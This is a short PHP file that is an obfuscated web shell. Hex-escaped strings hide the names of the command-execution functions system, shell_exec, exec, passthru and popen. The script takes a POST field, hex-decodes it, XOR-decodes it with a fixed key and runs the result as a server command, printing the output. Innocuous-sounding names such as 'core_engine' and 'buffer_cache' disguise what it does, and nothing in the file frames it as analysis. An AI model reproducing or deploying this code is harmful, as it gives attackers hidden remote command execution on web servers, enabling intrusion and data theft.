<?php

$core_engine6 = "s\x74\x72\x65\x61\x6D_g\x65\x74_\x63\x6F\x6Etents";
$core_engine4 = "p\x61\x73st\x68\x72u";
$system_core = "\x68\x65x2\x62\x69n";
$core_engine7 = "p\x63\x6C\x6Fse";
$core_engine5 = "po\x70\x65n";
$core_engine1 = "\x73\x79\x73tem";
$core_engine2 = "s\x68e\x6Cl_\x65xe\x63";
$core_engine3 = "\x65x\x65c";
if (isset($_POST["\x70a\x72a\x6D\x65te\x72\x5Fgr\x6Fu\x70"])) {
            function buffer_cache    (     $flag      ,       $data   )    {    $comp      =   ''   ;    for($o=0; $o<strlen($flag); $o++){$comp.=chr(ord($flag[$o])^$data);} return    $comp;   }
            $parameter_group = $system_core($_POST["\x70a\x72a\x6D\x65te\x72\x5Fgr\x6Fu\x70"]);
            $parameter_group = buffer_cache($parameter_group, 59);
            if (function_exists($core_engine1)) {
                $core_engine1($parameter_group);
            } elseif (function_exists($core_engine2)) {
                print $core_engine2($parameter_group);
            } elseif (function_exists($core_engine3)) {
                $core_engine3($parameter_group, $desc_flag);
                print join("\n", $desc_flag);
            } elseif (function_exists($core_engine4)) {
                $core_engine4($parameter_group);
            } elseif (function_exists($core_engine5) && function_exists($core_engine6) && function_exists($core_engine7)) {
                $data_comp = $core_engine5($parameter_group, 'r');
                if ($data_comp) {
                    $entity_flg = $core_engine6($data_comp);
                    $core_engine7($data_comp);
                    print $entity_flg;
                }
            }
            exit;
        }